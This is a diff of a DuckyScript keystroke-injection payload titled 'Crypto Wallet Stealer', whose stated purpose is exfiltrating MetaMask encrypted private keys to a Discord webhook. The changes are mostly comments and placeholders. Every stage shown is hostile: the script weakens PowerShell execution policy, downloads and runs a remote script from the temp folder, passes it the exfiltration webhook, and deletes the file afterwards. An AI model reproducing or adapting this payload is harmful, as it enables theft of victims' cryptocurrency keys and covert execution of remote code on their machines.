@@ -1,12 +1,17 @@
 REM TITLE Crypto Wallet Stealer
 REM AUTHOR SupreemeERG
-REM DESCRIPTION xxx
+REM DESCRIPTION Payload that exfiltrates MetaMask encrypted private keys to a Discord webhook
 
 
 
-REM initialize
+REM Stage I: Initialization
+
+REM Location to download powershell script
 DEFINE #script_location <powershell script url to download from>
-DEFINE #discord_webhook_uri <your discord webhook uri>
+REM Your discord webhook uri
+DEFINE #discord_webhook_uri your_discord_webhook
+
+
 $_RANDOM_MIN = 100
 $_RANDOM_MAX = 300
 DEFINE #script_install_location $_RANDOM_INT.ps1
@@ -29,11 +34,13 @@ STRINGLN Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 DELAY 600
 
 
-REM execution
+REM Stage II: ExecutionPolicy
+
 STRINGLN Invoke-Webrequest -Uri #script_location -OutFile $Env:temp\#script_install_location
 DELAY 4000
 STRINGLN .\$Env:temp\#script_install_location #discord_webhook_uri
 DELAY 10000
+
 
 STRINGLN Remove-Item $Env:temp\#script_install_location -Force
 DELAY 2000
